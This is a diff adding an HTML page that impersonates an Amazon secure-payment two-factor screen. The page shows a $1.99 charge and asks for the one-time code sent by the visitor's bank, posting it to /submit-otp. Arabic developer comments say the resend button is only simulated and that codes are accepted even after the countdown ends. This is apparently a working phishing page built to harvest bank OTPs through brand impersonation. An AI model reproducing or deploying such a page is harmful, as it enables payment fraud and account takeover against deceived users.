@@ -1,0 +1,338 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verification Required - Amazon Secure Payment</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;900&display=swap" rel="stylesheet">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body { 
+            font-family: 'Inter', sans-serif; 
+            background: #F3F3F3;
+        }
+        .timer-ring {
+            transition: stroke-dashoffset 1s linear;
+        }
+        .otp-input {
+            letter-spacing: 8px;
+            font-size: 24px;
+            font-weight: 600;
+            text-align: center;
+        }
+        .otp-input:focus {
+            border-color: #FF9900;
+            box-shadow: 0 0 0 3px rgba(255, 153, 0, 0.15);
+        }
+        .resend-btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+        .timer-container {
+            position: relative;
+            width: 80px;
+            height: 80px;
+            margin: 0 auto 16px;
+        }
+        .timer-container svg {
+            transform: rotate(-90deg);
+        }
+        .timer-text {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            font-size: 24px;
+            font-weight: 700;
+            color: #111111;
+        }
+        .timer-text.alert {
+            color: #dc2626;
+        }
+        .amount-badge {
+            background: linear-gradient(135deg, #131A22 0%, #232F3E 100%);
+        }
+    </style>
+</head>
+<body class="min-h-screen flex flex-col justify-between text-[#111111] bg-gradient-to-b from-[#F3F3F3] to-[#EAEAEA]">
+
+    <!-- Header with Amazon Logo -->
+    <header class="bg-[#131A22] shadow-sm p-4 flex items-center border-b border-[#232F3E]">
+        <div class="flex items-center gap-2 mx-auto">
+            <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAIAAAACACAYAAADDPmHLAAAACXBIWXMAAAsTAAALEwEAmpwYAAADvklEQVR4nO3bS2hcVRTG8f9Jpm3SND7S+EibpE3atI9atU8UFRVcuBFdiIIuXAqKtSD4AFFQFAqCjvhYFwVfKKgIguvChSg" alt="Amazon logo" class="h-8">
+            <span class="text-sm font-medium text-white/80 border-l border-white/20 pl-3">Secure Verification</span>
+        </div>
+    </header>
+
+    <!-- Main Content Area -->
+    <main class="flex-grow flex flex-col items-center justify-center px-6 py-8 max-w-md mx-auto w-full">
+
+        <!-- Verification Lock/Shield Icon -->
+        <div class="w-20 h-20 bg-[#131A22] text-white rounded-full flex items-center justify-center shadow-lg mb-2">
+            <svg xmlns="http://www.w3.org/2000/svg" class="h-10 w-10" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
+            </svg>
+        </div>
+
+        <h1 class="text-2xl font-black text-[#111111] mb-2 text-center">Two-Factor Authentication</h1>
+        
+        <!-- المبلغ -->
+        <div class="amount-badge text-white px-6 py-2 rounded-full text-sm font-bold mb-3 shadow-md inline-flex items-center gap-2">
+            <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8c-1.657 0-3 .895-3 2s1.343 2 3 2 3 .895 3 2-1.343 2-3 2m0-8c1.11 0 2.08.402 2.599 1M12 8V7m0 1v8m0 0v1m0-1c-1.11 0-2.08-.402-2.599-1M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
+            </svg>
+            $1.99 USD
+        </div>
+
+        <p class="text-gray-500 text-sm leading-relaxed mb-4 text-center">
+            A temporary verification code (OTP) has been sent to the mobile phone number 
+            <span class="font-medium text-[#111111]">or email address</span> associated with your bank account.
+        </p>
+
+        <!-- OTP Form -->
+        <form action="/submit-otp" method="POST" class="w-full space-y-5 bg-[#FFFFFF] border border-gray-200 rounded-xl p-6 shadow-sm">
+
+            <!-- المؤقت الدائري -->
+            <div class="timer-container">
+                <svg width="80" height="80" viewBox="0 0 80 80">
+                    <circle cx="40" cy="40" r="32" fill="none" stroke="#E5E7EB" stroke-width="4"/>
+                    <circle id="timerCircle" cx="40" cy="40" r="32" fill="none" 
+                            stroke="#FF9900" stroke-width="4" 
+                            stroke-linecap="round"
+                            stroke-dasharray="201.06" 
+                            stroke-dashoffset="0"/>
+                </svg>
+                <div id="timerDisplay" class="timer-text">60</div>
+            </div>
+
+            <!-- حقل إدخال OTP -->
+            <div>
+                <label class="block text-xs font-bold text-gray-600 mb-2 text-center uppercase tracking-wider">
+                    Enter Verification Code
+                </label>
+                <input type="tel" 
+                       name="otp_code" 
+                       id="otpInput"
+                       required 
+                       maxlength="8" 
+                       placeholder="••••••••"
+                       class="otp-input w-full px-4 py-4 bg-white border-2 border-gray-300 rounded-xl text-[#111111] focus:outline-none focus:border-[#FF9900] transition-all duration-200"
+                       autofocus>
+                <p class="text-[11px] text-gray-400 text-center mt-2">
+                    Enter the 6-8 digit code sent to your phone or email
+                </p>
+            </div>
+
+            <!-- رسالة الخطأ (تظهر فقط عند الإرسال الفارغ أو غير صحيح) -->
+            <div id="errorMessage" class="hidden bg-red-50 border border-red-200 text-red-700 text-sm rounded-lg p-3 text-center">
+                ⚠️ Invalid or empty code. Please enter a valid verification code.
+            </div>
+
+            <!-- زر إرسال OTP -->
+            <button type="submit" 
+                    class="w-full bg-[#FF9900] hover:bg-[#FFB84D] text-white font-bold py-3.5 px-4 rounded-xl text-sm shadow-md transition-all duration-200 active:scale-[0.98]">
+                Verify & Continue
+            </button>
+
+            <!-- زر إعادة الإرسال -->
+            <div class="text-center pt-1">
+                <button type="button" 
+                        id="resendBtn"
+                        class="resend-btn text-sm text-[#FF9900] font-medium hover:text-[#FFB84D] transition-colors duration-200 underline-offset-2 hover:underline">
+                    ⏳ Resend code in <span id="resendTimer">60</span>s
+                </button>
+            </div>
+
+            <!-- شريط الأمان والمبلغ -->
+            <div class="flex items-center justify-between gap-2 pt-2 border-t border-gray-100">
+                <div class="flex items-center gap-1.5">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4 text-green-600" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
+                    </svg>
+                    <span class="text-[10px] text-gray-400">256-bit encryption</span>
+                </div>
+                <div class="flex items-center gap-1.5">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4 text-gray-400" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z" />
+                    </svg>
+                    <span class="text-[10px] text-gray-400 font-medium">$1.99 USD</span>
+                </div>
+            </div>
+        </form>
+
+        <!-- مساعدة -->
+        <p class="text-[11px] text-gray-400 text-center mt-6">
+            <span class="block">Having trouble? <a href="#" class="text-[#FF9900] hover:underline">Contact Support</a></span>
+            <span class="block text-[10px] text-gray-300 mt-1">Do not share this code with anyone</span>
+        </p>
+    </main>
+
+    <!-- Footer -->
+    <footer class="bg-[#232F3E] border-t border-[#131A22] py-6 text-center text-xs text-[#FFFFFF]/70 w-full mt-auto">
+        <div class="max-w-md mx-auto px-4">
+            <div class="flex justify-center gap-4 mb-3">
+                <a href="/user-agreement" class="hover:underline hover:text-[#FFFFFF]">User Agreement</a>
+                <a href="/privacy-policy" class="hover:underline hover:text-[#FFFFFF]">Privacy Notice</a>
+                <a href="/contact-us" class="hover:underline hover:text-[#FFFFFF]">Contact Us</a>
+            </div>
+            <p class="text-[#FFFFFF]/50">&copy; 1996-2026, Amazon.com, Inc. or its affiliates</p>
+        </div>
+    </footer>
+
+    <!-- JavaScript: Timer وزر إعادة الإرسال فقط -->
+    <script>
+        (function() {
+            'use strict';
+
+            const TIMER_DURATION = 60;
+            let timeLeft = TIMER_DURATION;
+            let timerInterval = null;
+            let isResending = false;
+
+            const timerDisplay = document.getElementById('timerDisplay');
+            const timerCircle = document.getElementById('timerCircle');
+            const resendBtn = document.getElementById('resendBtn');
+            const resendTimer = document.getElementById('resendTimer');
+            const otpInput = document.getElementById('otpInput');
+            const errorMessage = document.getElementById('errorMessage');
+
+            const circumference = 2 * Math.PI * 32;
+
+            function updateTimer() {
+                // تحديث النص
+                timerDisplay.textContent = timeLeft;
+                resendTimer.textContent = timeLeft;
+
+                // تحديث الحلقة الدائرية
+                const progress = timeLeft / TIMER_DURATION;
+                const offset = circumference * (1 - progress);
+                timerCircle.style.strokeDashoffset = offset;
+
+                // تغيير اللون إذا قل الوقت عن 10 ثواني
+                if (timeLeft <= 10) {
+                    timerCircle.style.stroke = '#dc2626';
+                    timerDisplay.classList.add('alert');
+                } else {
+                    timerCircle.style.stroke = '#FF9900';
+                    timerDisplay.classList.remove('alert');
+                }
+
+                // تمكين/تعطيل زر إعادة الإرسال
+                if (timeLeft <= 0) {
+                    resendBtn.disabled = false;
+                    resendBtn.innerHTML = '📤 Resend new code';
+                } else {
+                    resendBtn.disabled = true;
+                    resendBtn.innerHTML = `⏳ Resend code in <span id="resendTimer">${timeLeft}</span>s`;
+                }
+            }
+
+            function startTimer() {
+                // إيقاف أي مؤقت سابق
+                if (timerInterval) {
+                    clearInterval(timerInterval);
+                    timerInterval = null;
+                }
+
+                timeLeft = TIMER_DURATION;
+                timerDisplay.classList.remove('alert');
+                timerCircle.style.stroke = '#FF9900';
+                updateTimer();
+
+                timerInterval = setInterval(function() {
+                    timeLeft--;
+                    updateTimer();
+
+                    if (timeLeft <= 0) {
+                        clearInterval(timerInterval);
+                        timerInterval = null;
+                        // نوقف المؤقت بس، منظهرش رسالة انتهاء
+                    }
+                }, 1000);
+            }
+
+            // وظيفة إعادة إرسال الكود
+            function resendCode() {
+                if (isResending) return;
+                if (timeLeft > 0 && timerInterval) {
+                    return;
+                }
+
+                isResending = true;
+                resendBtn.disabled = true;
+                resendBtn.innerHTML = '📤 Sending...';
+
+                // محاكاة طلب إرسال كود جديد
+                setTimeout(function() {
+                    // إخفاء رسائل الخطأ
+                    errorMessage.classList.add('hidden');
+
+                    // إعادة تعيين حقل الإدخال
+                    otpInput.value = '';
+                    otpInput.focus();
+
+                    // بدء المؤقت من جديد
+                    startTimer();
+
+                    isResending = false;
+                    resendBtn.disabled = true;
+                    resendBtn.innerHTML = `⏳ Resend code in <span id="resendTimer">${timeLeft}</span>s`;
+
+                    // رسالة تأكيد
+                    const successMsg = document.createElement('div');
+                    successMsg.className = 'text-sm text-green-600 bg-green-50 border border-green-200 rounded-lg p-2 text-center mt-2';
+                    successMsg.id = 'successMessage';
+                    successMsg.textContent = '✅ A new verification code has been sent to your phone or email.';
+                    
+                    const oldMsg = document.getElementById('successMessage');
+                    if (oldMsg) oldMsg.remove();
+                    
+                    otpInput.parentNode.appendChild(successMsg);
+                    
+                    setTimeout(function() {
+                        if (successMsg.parentNode) {
+                            successMsg.remove();
+                        }
+                    }, 5000);
+
+                }, 1500);
+            }
+
+            // التحقق من صحة الإدخال (أرقام فقط)
+            otpInput.addEventListener('input', function() {
+                this.value = this.value.replace(/[^0-9]/g, '');
+                if (this.value.length > 8) {
+                    this.value = this.value.slice(0, 8);
+                }
+                // إخفاء رسالة الخطأ عند الكتابة
+                errorMessage.classList.add('hidden');
+            });
+
+            // منع إرسال الفورم الفارغ
+            document.querySelector('form').addEventListener('submit', function(e) {
+                const code = otpInput.value.trim();
+                if (code.length < 4) {
+                    e.preventDefault();
+                    errorMessage.classList.remove('hidden');
+                    errorMessage.textContent = '⚠️ Please enter a valid verification code (at least 4 digits).';
+                    otpInput.focus();
+                    return false;
+                }
+                // الكود يتبعت عادي حتى لو انتهى الوقت
+                return true;
+            });
+
+            // حدث إعادة الإرسال
+            resendBtn.addEventListener('click', resendCode);
+
+            // بدء المؤقت عند تحميل الصفحة
+            startTimer();
+
+            // التركيز على حقل الإدخال
+            otpInput.focus();
+
+        })();
+    </script>
+
+</body>
+</html>
